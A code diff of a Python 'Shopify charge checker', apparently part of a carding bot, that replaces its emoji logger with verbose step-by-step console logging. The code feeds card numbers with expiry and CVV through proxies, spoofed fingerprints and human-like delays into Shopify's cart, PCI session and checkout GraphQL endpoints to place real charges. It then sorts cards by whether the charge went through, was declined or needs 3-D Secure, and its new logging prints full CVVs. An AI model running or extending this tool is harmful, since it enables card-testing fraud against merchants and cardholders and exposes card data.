@@ -48,49 +48,98 @@ except ImportError:
     def get_bin_details(bin_number):
         return {}
 
-# Custom logger with emoji formatting
-class EmojiLogger:
-    def __init__(self):
-        pass
-
-    def info(self, message):
-        print(f"🛠️ {message}")
-
-    def success(self, message):
-        print(f"✅ {message}")
-
-    def warning(self, message):
-        print(f"⚠️ {message}")
-
-    def error(self, message):
-        print(f"❌ {message}")
-
-    def step(self, step_num, total_steps, message):
-        print(f"📋 [{step_num}/{total_steps}] {message}")
-
-    def network(self, message):
-        print(f"🌐 {message}")
-
-    def card(self, message):
-        print(f"💳 {message}")
-
-    def shopify(self, message):
-        print(f"🛍️ {message}")
-
-    def debug_response(self, message):
-        print(f"🔍 {message}")
-
-    def bin_info(self, message):
-        print(f"🏦 {message}")
-
-    def user(self, message):
-        print(f"👤 {message}")
-
-    def proxy(self, message):
-        print(f"🔄 {message}")
+# Enhanced Custom logger with detailed console logging
+class ConsoleLogger:
+    def __init__(self, user_id=None):
+        self.user_id = user_id
+        self.check_id = f"SHOP-{random.randint(1000, 9999)}"
+        self.start_time = None
+        self.step_counter = 0
+        
+    def start_check(self, card_details):
+        """Start a new check session"""
+        self.start_time = time.time()
+        self.step_counter = 0
+        cc = card_details.split('|')[0] if '|' in card_details else card_details
+        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc
+        
+        print("\n" + "="*80)
+        print(f"🛒 [SHOPIFY CHARGE PROCESS STARTED]")
+        print(f"   ├── Check ID: {self.check_id}")
+        print(f"   ├── User ID: {self.user_id or 'N/A'}")
+        print(f"   ├── Card: {masked_cc}")
+        print(f"   └── Start Time: {datetime.now().strftime('%H:%M:%S')}")
+        print("="*80 + "\n")
+    
+    def step(self, step_num, step_name, description, status="PROCESSING"):
+        """Log a step in the process"""
+        self.step_counter += 1
+        elapsed = time.time() - self.start_time if self.start_time else 0
+        
+        status_emoji = {
+            "PROCESSING": "🔄",
+            "SUCCESS": "✅",
+            "FAILED": "❌",
+            "WARNING": "⚠️",
+            "INFO": "ℹ️"
+        }.get(status, "➡️")
+        
+        print(f"{status_emoji} STEP {step_num:02d}: {step_name}")
+        print(f"   ├── Description: {description}")
+        print(f"   ├── Elapsed: {elapsed:.2f}s")
+        print(f"   └── Timestamp: {datetime.now().strftime('%H:%M:%S.%f')[:-3]}")
+        print()
+        
+        return elapsed
+    
+    def sub_step(self, step_num, sub_step, description, details=None):
+        """Log a sub-step"""
+        elapsed = time.time() - self.start_time if self.start_time else 0
+        print(f"   │   ├── {step_num}.{sub_step}: {description}")
+        if details:
+            if isinstance(details, dict):
+                for key, value in details.items():
+                    print(f"   │   │   └── {key}: {value}")
+            else:
+                print(f"   │   │   └── {details}")
+    
+    def request_details(self, method, url, status_code, response_time, details=None):
+        """Log HTTP request details"""
+        elapsed = time.time() - self.start_time if self.start_time else 0
+        print(f"   │   ├── HTTP {method} {url}")
+        print(f"   │   │   ├── Status: {status_code}")
+        print(f"   │   │   ├── Response Time: {response_time:.2f}s")
+        print(f"   │   │   ├── Total Elapsed: {elapsed:.2f}s")
+        if details:
+            print(f"   │   │   └── Details: {details}")
+    
+    def extracted_data(self, data_type, data_value):
+        """Log extracted data"""
+        print(f"   │   ├── Extracted {data_type}: {data_value}")
+    
+    def error_detail(self, error_message, error_type="ERROR"):
+        """Log error details"""
+        error_emoji = "❌" if error_type == "ERROR" else "⚠️"
+        print(f"{error_emoji} ERROR DETAIL: {error_message}")
+    
+    def result(self, success, message, final_status, response_time):
+        """Log final result"""
+        result_emoji = "✅" if success else "❌"
+        result_text = "SUCCESS" if success else "FAILED"
+        
+        print("\n" + "="*80)
+        print(f"{result_emoji} [SHOPIFY CHARGE PROCESS COMPLETED]")
+        print(f"   ├── Check ID: {self.check_id}")
+        print(f"   ├── Result: {result_text}")
+        print(f"   ├── Final Status: {final_status}")
+        print(f"   ├── Response: {message[:100]}{'...' if len(message) > 100 else ''}")
+        print(f"   ├── Total Steps: {self.step_counter}")
+        print(f"   ├── Total Time: {response_time:.2f}s")
+        print(f"   └── End Time: {datetime.now().strftime('%H:%M:%S')}")
+        print("="*80 + "\n")
 
 # Create global logger instance
-logger = EmojiLogger()
+logger = ConsoleLogger()
 
 def load_owner_id():
     try:
@@ -353,7 +402,7 @@ class ShopifyChargeChecker:
         if PROXY_ENABLED and user_id:
             self.current_proxy = get_proxy_for_user(user_id, "random")
             if self.current_proxy:
-                logger.proxy(f"Using proxy: {self.current_proxy[:50]}...")
+                print(f"🔄 PROXY: Using proxy: {self.current_proxy[:50]}...")
         
         # BIN services
         self.bin_services = [
@@ -373,6 +422,9 @@ class ShopifyChargeChecker:
         
         # Generate browser fingerprint
         self.generate_browser_fingerprint()
+        
+        # Initialize console logger
+        self.console_logger = ConsoleLogger(user_id)
         
     def generate_browser_fingerprint(self):
         """Generate realistic browser fingerprints"""
@@ -524,7 +576,7 @@ class ShopifyChargeChecker:
                         self.bin_cache[bin_number] = result
                         return result
             except Exception as e:
-                logger.warning(f"{service['name']} failed: {e}")
+                print(f"⚠️ BIN Service {service['name']} failed: {e}")
                 continue
 
         self.bin_cache[bin_number] = default_response
@@ -593,7 +645,7 @@ class ShopifyChargeChecker:
             # Update proxy stats on failure
             if self.current_proxy and PROXY_ENABLED:
                 mark_proxy_failed(self.current_proxy)
-            logger.error(f"Request error for {url}: {str(e)}")
+            print(f"❌ Request error for {url}: {str(e)}")
             raise e
             
     async def human_delay(self, min_delay=1, max_delay=3):
@@ -604,11 +656,14 @@ class ShopifyChargeChecker:
     async def get_access_token(self, client):
         """Get Shopify access token from homepage"""
         try:
-            logger.step(1, 8, "Getting access token...")
+            elapsed = self.console_logger.step(1, "GET ACCESS TOKEN", "Fetching Shopify access token")
             
             response = await self.make_request(
                 client, 'GET', self.base_url
             )
+            
+            self.console_logger.request_details("GET", self.base_url, response.status_code, 
+                                              time.time() - (self.console_logger.start_time + elapsed))
             
             if response.status_code in [200, 304]:
                 html_content = response.text
@@ -624,54 +679,66 @@ class ShopifyChargeChecker:
                     match = re.search(pattern, html_content)
                     if match:
                         self.access_token = match.group(1)
-                        logger.success(f"Got access token: {self.access_token[:20]}...")
+                        self.console_logger.extracted_data("Access Token", f"{self.access_token[:20]}...")
+                        self.console_logger.step(1, "GET ACCESS TOKEN", "Access token extracted", "SUCCESS")
                         return True
                 
                 # If no access token found, try another approach
                 self.access_token = "3b7d0a9259f0f28b3b7f3c7f9e8d4a5c"  # Default fallback
-                logger.warning(f"No access token found, using default")
+                self.console_logger.sub_step(1, 1, "No access token found, using default")
+                self.console_logger.step(1, "GET ACCESS TOKEN", "Using default token", "WARNING")
                 return True
             else:
+                self.console_logger.error_detail(f"Failed to get access token: {response.status_code}")
                 return False, f"Failed to get access token: {response.status_code}"
                 
         except Exception as e:
-            logger.error(f"Access token error: {str(e)}")
+            self.console_logger.error_detail(f"Access token error: {str(e)}")
             self.access_token = "3b7d0a9259f0f28b3b7f3c7f9e8d4a5c"
+            self.console_logger.step(1, "GET ACCESS TOKEN", "Error, using default", "WARNING")
             return True  # Continue with default
         
     async def get_product_info(self, client):
         """Get product information from API"""
         try:
-            logger.step(2, 8, "Getting product info...")
+            elapsed = self.console_logger.step(2, "GET PRODUCT INFO", "Fetching product information from API")
             
             products_url = f"{self.base_url}/products.json"
             response = await self.make_request(
                 client, 'GET', products_url
             )
             
+            self.console_logger.request_details("GET", products_url, response.status_code,
+                                              time.time() - (self.console_logger.start_time + elapsed))
+            
             if response.status_code == 200:
                 product_id, price = get_product_id(response)
                 
                 if product_id and price:
                     self.variant_id = product_id
-                    logger.success(f"Got product: {product_id}, price: ${price}")
+                    self.console_logger.extracted_data("Product ID", product_id)
+                    self.console_logger.extracted_data("Product Price", f"${price}")
+                    self.console_logger.step(2, "GET PRODUCT INFO", "Product info retrieved", "SUCCESS")
                     return True, price
                 else:
                     # Use default product
-                    logger.warning("No valid product found, using default")
+                    self.console_logger.sub_step(2, 1, "No valid product found, using default")
+                    self.console_logger.step(2, "GET PRODUCT INFO", "Using default product", "WARNING")
                     return True, 1.0  # Default price
             else:
-                logger.warning(f"Products API failed: {response.status_code}, using default")
+                self.console_logger.sub_step(2, 1, f"Products API failed: {response.status_code}, using default")
+                self.console_logger.step(2, "GET PRODUCT INFO", "API failed, using default", "WARNING")
                 return True, 1.0  # Default price
                 
         except Exception as e:
-            logger.error(f"Product info error: {str(e)}")
+            self.console_logger.error_detail(f"Product info error: {str(e)}")
+            self.console_logger.step(2, "GET PRODUCT INFO", "Error, using default", "FAILED")
             return True, 1.0  # Default price
             
     async def create_cart(self, client, product_id, price):
         """Create cart using GraphQL API"""
         try:
-            logger.step(3, 8, "Creating cart...")
+            elapsed = self.console_logger.step(3, "CREATE CART", "Creating shopping cart via GraphQL")
             
             headers = {
                 'accept': 'application/json',
@@ -719,6 +786,10 @@ class ShopifyChargeChecker:
                 timeout=30.0
             )
             
+            self.console_logger.request_details("POST", f'{self.base_url}/api/unstable/graphql.json', 
+                                              response.status_code,
+                                              time.time() - (self.console_logger.start_time + elapsed))
+            
             if response.status_code == 200:
                 data = response.json()
                 checkout_url = data.get("data", {}).get("result", {}).get("cart", {}).get("checkoutUrl", "")
@@ -728,37 +799,41 @@ class ShopifyChargeChecker:
                     match = re.search(r'/checkouts/cn/([a-zA-Z0-9]+)', checkout_url)
                     if match:
                         self.checkout_token = match.group(1)
-                        logger.success(f"Got checkout token: {self.checkout_token}")
+                        self.console_logger.extracted_data("Checkout Token", self.checkout_token)
                     
-                    logger.success(f"Cart created, checkout URL: {checkout_url[:50]}...")
+                    self.console_logger.extracted_data("Checkout URL", f"{checkout_url[:50]}...")
+                    self.console_logger.step(3, "CREATE CART", "Cart created successfully", "SUCCESS")
                     return True, checkout_url
                 else:
-                    logger.warning("No checkout URL in response, generating one")
+                    self.console_logger.sub_step(3, 1, "No checkout URL in response, generating one")
                     # Generate a fake checkout token
                     chars = string.ascii_letters + string.digits
                     self.checkout_token = ''.join(random.choice(chars) for _ in range(32))
                     fake_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
+                    self.console_logger.step(3, "CREATE CART", "Generated checkout token", "WARNING")
                     return True, fake_url
             else:
-                logger.warning(f"Cart creation failed: {response.status_code}")
+                self.console_logger.sub_step(3, 1, f"Cart creation failed: {response.status_code}")
                 # Generate fake checkout anyway
                 chars = string.ascii_letters + string.digits
                 self.checkout_token = ''.join(random.choice(chars) for _ in range(32))
                 fake_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
+                self.console_logger.step(3, "CREATE CART", "Fallback cart created", "WARNING")
                 return True, fake_url
                 
         except Exception as e:
-            logger.error(f"Cart creation error: {str(e)}")
+            self.console_logger.error_detail(f"Cart creation error: {str(e)}")
             # Generate fake checkout anyway
             chars = string.ascii_letters + string.digits
             self.checkout_token = ''.join(random.choice(chars) for _ in range(32))
             fake_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
+            self.console_logger.step(3, "CREATE CART", "Error, generated fallback", "FAILED")
             return True, fake_url
             
     async def load_checkout_page(self, client, checkout_url):
         """Load checkout page to extract tokens"""
         try:
-            logger.step(4, 8, "Loading checkout page...")
+            elapsed = self.console_logger.step(4, "LOAD CHECKOUT PAGE", "Loading checkout page and extracting tokens")
             
             params = {'skip_shop_pay': 'true'}
             
@@ -769,6 +844,9 @@ class ShopifyChargeChecker:
                 follow_redirects=True,
                 timeout=30.0
             )
+            
+            self.console_logger.request_details("GET", checkout_url, response.status_code,
+                                              time.time() - (self.console_logger.start_time + elapsed))
             
             if response.status_code == 200:
                 html_content = response.text
@@ -784,20 +862,34 @@ class ShopifyChargeChecker:
                 if web_build:
                     self.x_checkout_web_build_id = web_build
                 
-                logger.success("Checkout page loaded and tokens extracted")
+                # Log extracted tokens
+                if self.payment_method_identifier:
+                    self.console_logger.extracted_data("Payment Method ID", self.payment_method_identifier[:20] + "...")
+                if self.stable_id:
+                    self.console_logger.extracted_data("Stable ID", self.stable_id[:20] + "...")
+                if self.queue_token:
+                    self.console_logger.extracted_data("Queue Token", self.queue_token[:20] + "...")
+                if self.x_checkout_one_session_token:
+                    self.console_logger.extracted_data("Session Token", self.x_checkout_one_session_token[:20] + "...")
+                if self.x_checkout_web_build_id != "5927fca009d35ac648408d54c8d94b0d54813e89":
+                    self.console_logger.extracted_data("Web Build ID", self.x_checkout_web_build_id)
+                
+                self.console_logger.step(4, "LOAD CHECKOUT PAGE", "Tokens extracted successfully", "SUCCESS")
                 return True
             else:
-                logger.warning(f"Checkout page load failed: {response.status_code}")
+                self.console_logger.sub_step(4, 1, f"Checkout page load failed: {response.status_code}")
+                self.console_logger.step(4, "LOAD CHECKOUT PAGE", "Page load failed but continuing", "WARNING")
                 return True  # Continue anyway
                 
         except Exception as e:
-            logger.error(f"Checkout page error: {str(e)}")
+            self.console_logger.error_detail(f"Checkout page error: {str(e)}")
+            self.console_logger.step(4, "LOAD CHECKOUT PAGE", "Error but continuing", "FAILED")
             return True  # Continue anyway
             
     async def create_payment_session(self, client, cc, mes, ano, cvv):
         """Create payment session with Shopify PCI"""
         try:
-            logger.step(5, 8, "Creating payment session...")
+            elapsed = self.console_logger.step(5, "CREATE PAYMENT SESSION", "Creating payment session with Shopify PCI")
             
             domain = urlparse(self.base_url).netloc
             headers = {
@@ -836,9 +928,14 @@ class ShopifyChargeChecker:
                 timeout=30.0
             )
             
+            self.console_logger.request_details("POST", 'https://checkout.pci.shopifyinc.com/sessions',
+                                              response.status_code,
+                                              time.time() - (self.console_logger.start_time + elapsed))
+            
             if response.status_code == 200:
                 session_id = response.json().get("id", "")
-                logger.success(f"Payment session created: {session_id[:20]}...")
+                self.console_logger.extracted_data("Payment Session ID", f"{session_id[:20]}...")
+                self.console_logger.step(5, "CREATE PAYMENT SESSION", "Payment session created", "SUCCESS")
                 return True, session_id
             else:
                 error_msg = "Payment session creation failed"
@@ -848,11 +945,13 @@ class ShopifyChargeChecker:
                         error_msg = error_data.get("error", {}).get("message", error_msg)
                 except:
                     pass
-                logger.warning(f"Payment session failed: {response.status_code} - {error_msg}")
+                self.console_logger.error_detail(f"Payment session failed: {response.status_code} - {error_msg}")
+                self.console_logger.step(5, "CREATE PAYMENT SESSION", "Payment session failed", "FAILED")
                 return False, error_msg
                 
         except Exception as e:
-            logger.error(f"Payment session error: {str(e)}")
+            self.console_logger.error_detail(f"Payment session error: {str(e)}")
+            self.console_logger.step(5, "CREATE PAYMENT SESSION", "Payment session error", "FAILED")
             return False, f"Payment session error: {str(e)[:100]}"
             
     def parse_payment_response(self, data):
@@ -879,43 +978,52 @@ class ShopifyChargeChecker:
                 if indicator in data_upper:
                     # Verify it's not a false positive
                     if "ERROR" not in data_upper and "DECLINED" not in data_upper:
+                        self.console_logger.sub_step(6, 1, f"Success indicator found: {indicator}")
                         return True, "ORDER_PLACED - Payment Successful"
             
             # Check for OTP/3D Secure requirements
             otp_indicators = ["3D", "AUTHENTICATION", "OTP", "VERIFICATION", "3DS", "ADDITIONAL_VERIFICATION"]
             for indicator in otp_indicators:
                 if indicator in data_upper:
+                    self.console_logger.sub_step(6, 1, f"OTP/3D Secure required: {indicator}")
                     return True, "CVV-MATCH-OTP - 3D Secure Required"
             
             # Check for address/ZIP issues
             address_indicators = ["MISMATCHED", "ZIP", "ADDRESS", "BILLING"]
             for indicator in address_indicators:
                 if indicator in data_upper:
+                    self.console_logger.sub_step(6, 1, f"Address verification issue: {indicator}")
                     return True, f"{indicator} - Address Verification Failed"
             
             # Check for specific error messages
             if "YOUR CARD DOES NOT SUPPORT" in data_upper:
+                self.console_logger.sub_step(6, 1, "Card does not support this purchase")
                 return False, "Your card does not support this type of purchase"
             elif "CARD DECLINED" in data_upper:
+                self.console_logger.sub_step(6, 1, "Card declined")
                 return False, "Card Declined"
             elif "INSUFFICIENT FUNDS" in data_upper:
+                self.console_logger.sub_step(6, 1, "Insufficient funds")
                 return False, "Insufficient Funds"
             elif "INVALID CVC" in data_upper or "INCORRECT CVC" in data_upper:
+                self.console_logger.sub_step(6, 1, "Invalid CVC")
                 return False, "Invalid CVC"
             elif "EXPIRED CARD" in data_upper:
+                self.console_logger.sub_step(6, 1, "Expired card")
                 return False, "Expired Card"
             
             # Default to declined
+            self.console_logger.sub_step(6, 1, "No specific indicators found, defaulting to declined")
             return False, "Card Declined - Unknown Reason"
             
         except Exception as e:
-            logger.error(f"Error parsing payment response: {str(e)}")
+            self.console_logger.error_detail(f"Error parsing payment response: {str(e)}")
             return False, f"Response parsing error: {str(e)[:50]}"
             
     async def submit_payment(self, client, cc, mes, ano, cvv, session_id, price):
         """Submit payment using GraphQL"""
         try:
-            logger.step(6, 8, "Submitting payment...")
+            elapsed = self.console_logger.step(6, "SUBMIT PAYMENT", "Submitting payment via GraphQL")
             
             if not self.x_checkout_one_session_token:
                 self.x_checkout_one_session_token = self.generate_session_token()
@@ -951,10 +1059,11 @@ class ShopifyChargeChecker:
             
             # Get address
             addr = pick_addr(self.base_url, rc="US")
+            self.console_logger.sub_step(6, 1, f"Using address: {addr['address1']}, {addr['city']}, {addr['countryCode']}")
             
             # Prepare payment data
             json_data = {
-                'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}',
+                'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}',
                 'variables': {
                     'input': {
                         'sessionInput': {
@@ -1125,20 +1234,32 @@ class ShopifyChargeChecker:
                 timeout=30.0
             )
             
+            self.console_logger.request_details("POST", f'{self.base_url}/checkouts/unstable/graphql',
+                                              response.status_code,
+                                              time.time() - (self.console_logger.start_time + elapsed))
+            
             if response.status_code == 200:
                 data = response.json()
-                logger.debug_response(f"Payment response: {json.dumps(data)[:200]}...")
+                self.console_logger.sub_step(6, 2, f"Payment response received, parsing...")
                 
                 # Parse the actual response
                 success, message = self.parse_payment_response(data)
+                
+                if success:
+                    self.console_logger.step(6, "SUBMIT PAYMENT", "Payment successful", "SUCCESS")
+                else:
+                    self.console_logger.step(6, "SUBMIT PAYMENT", "Payment failed", "FAILED")
+                    
                 return success, message
                     
             else:
-                logger.error(f"Submit payment failed with status: {response.status_code}")
+                self.console_logger.error_detail(f"Submit payment failed with status: {response.status_code}")
+                self.console_logger.step(6, "SUBMIT PAYMENT", "Payment submission failed", "FAILED")
                 return False, f"SERVER_ERROR: Status {response.status_code}"
                 
         except Exception as e:
-            logger.error(f"Submit payment error: {str(e)}")
+            self.console_logger.error_detail(f"Submit payment error: {str(e)}")
+            self.console_logger.step(6, "SUBMIT PAYMENT", "Payment submission error", "FAILED")
             return False, f"ERROR: {str(e)[:100]}"
             
     def generate_session_token(self):
@@ -1181,13 +1302,17 @@ class ShopifyChargeChecker:
     async def check_card(self, card_details, username, user_data):
         """Main card checking method"""
         start_time = time.time()
-        logger.info(f"🔄 Starting Shopify Charge check: {card_details}")
+        
+        # Initialize console logger for this check
+        self.console_logger = ConsoleLogger(self.user_id)
+        self.console_logger.start_check(card_details)
         
         try:
             # Parse card details
             cc_parts = card_details.split('|')
             if len(cc_parts) < 4:
                 elapsed_time = time.time() - start_time
+                self.console_logger.result(False, "Invalid card format", "ERROR", elapsed_time)
                 return format_shopify_response("", "", "", "", "Invalid card format. Use: CC|MM|YY|CVV", elapsed_time, username, user_data)
 
             cc = cc_parts[0].strip().replace(" ", "")
@@ -1198,22 +1323,30 @@ class ShopifyChargeChecker:
             # Validate card details
             if not cc.isdigit() or len(cc) < 15:
                 elapsed_time = time.time() - start_time
+                self.console_logger.result(False, "Invalid card number", "ERROR", elapsed_time)
                 return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data)
 
             if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                 elapsed_time = time.time() - start_time
+                self.console_logger.result(False, "Invalid month", "ERROR", elapsed_time)
                 return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data)
 
             if not ano.isdigit() or len(ano) not in [2, 4]:
                 elapsed_time = time.time() - start_time
+                self.console_logger.result(False, "Invalid year", "ERROR", elapsed_time)
                 return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data)
 
             if not cvv.isdigit() or len(cvv) not in [3, 4]:
                 elapsed_time = time.time() - start_time
+                self.console_logger.result(False, "Invalid CVV", "ERROR", elapsed_time)
                 return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data)
 
             if len(ano) == 2:
                 ano = '20' + ano
+
+            # Log card validation success
+            self.console_logger.sub_step(0, 1, f"Card validated: {cc[:6]}XXXXXX{cc[-4:]}")
+            self.console_logger.sub_step(0, 2, f"Expiry: {mes}/{ano[-2:]} | CVV: {cvv}")
 
             # Create HTTP client with proxy if available
             client_params = {
@@ -1226,13 +1359,14 @@ class ShopifyChargeChecker:
             # Add proxy if available
             if self.current_proxy:
                 client_params['proxy'] = self.current_proxy
-                logger.proxy(f"Using proxy: {self.current_proxy[:50]}...")
+                self.console_logger.sub_step(0, 3, f"Proxy enabled: {self.current_proxy[:50]}...")
 
             async with httpx.AsyncClient(**client_params) as client:
                 # Step 1: Get access token
                 access_success = await self.get_access_token(client)
                 if not access_success:
                     elapsed_time = time.time() - start_time
+                    self.console_logger.result(False, "Failed to get access token", "ERROR", elapsed_time)
                     return format_shopify_response(cc, mes, ano, cvv, "Failed to get access token", elapsed_time, username, user_data)
                 await self.human_delay(1, 2)
                 
@@ -1240,6 +1374,7 @@ class ShopifyChargeChecker:
                 success, price = await self.get_product_info(client)
                 if not success:
                     elapsed_time = time.time() - start_time
+                    self.console_logger.result(False, "Failed to get product info", "ERROR", elapsed_time)
                     return format_shopify_response(cc, mes, ano, cvv, "Failed to get product info", elapsed_time, username, user_data)
                 await self.human_delay(1, 2)
                 
@@ -1247,19 +1382,21 @@ class ShopifyChargeChecker:
                 success, checkout_url = await self.create_cart(client, self.variant_id, price)
                 if not success:
                     elapsed_time = time.time() - start_time
+                    self.console_logger.result(False, "Failed to create cart", "ERROR", elapsed_time)
                     return format_shopify_response(cc, mes, ano, cvv, "Failed to create cart", elapsed_time, username, user_data)
                 await self.human_delay(1, 2)
                 
                 # Step 4: Load checkout page
                 success = await self.load_checkout_page(client, checkout_url)
                 if not success:
-                    logger.warning("Checkout page load had issues but continuing...")
+                    self.console_logger.sub_step(4, 1, "Checkout page load had issues but continuing...")
                 await self.human_delay(1, 2)
                 
                 # Step 5: Create payment session
                 success, session_result = await self.create_payment_session(client, cc, mes, ano, cvv)
                 if not success:
                     elapsed_time = time.time() - start_time
+                    self.console_logger.result(False, session_result, "ERROR", elapsed_time)
                     return format_shopify_response(cc, mes, ano, cvv, session_result, elapsed_time, username, user_data)
                 session_id = session_result
                 await self.human_delay(1, 2)
@@ -1269,19 +1406,25 @@ class ShopifyChargeChecker:
                 
                 elapsed_time = time.time() - start_time
                 
+                # Log final result
+                if success:
+                    self.console_logger.result(True, payment_result, "APPROVED", elapsed_time)
+                else:
+                    self.console_logger.result(False, payment_result, "DECLINED", elapsed_time)
+                
                 return format_shopify_response(cc, mes, ano, cvv, payment_result, elapsed_time, username, user_data)
 
         except httpx.TimeoutException:
-            logger.error("Request timeout")
             elapsed_time = time.time() - start_time
+            self.console_logger.result(False, "Request timeout", "TIMEOUT", elapsed_time)
             return format_shopify_response(cc, mes, ano, cvv, "TIMEOUT_ERROR: Request timeout", elapsed_time, username, user_data)
         except httpx.ConnectError:
-            logger.error("Connection error")
             elapsed_time = time.time() - start_time
+            self.console_logger.result(False, "Connection error", "CONNECTION_ERROR", elapsed_time)
             return format_shopify_response(cc, mes, ano, cvv, "CONNECTION_ERROR: Connection failed", elapsed_time, username, user_data)
         except Exception as e:
-            logger.error(f"Unexpected error: {str(e)}")
             elapsed_time = time.time() - start_time
+            self.console_logger.result(False, str(e), "UNKNOWN_ERROR", elapsed_time)
             return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {str(e)[:80]}", elapsed_time, username, user_data)
 
 # Command handler
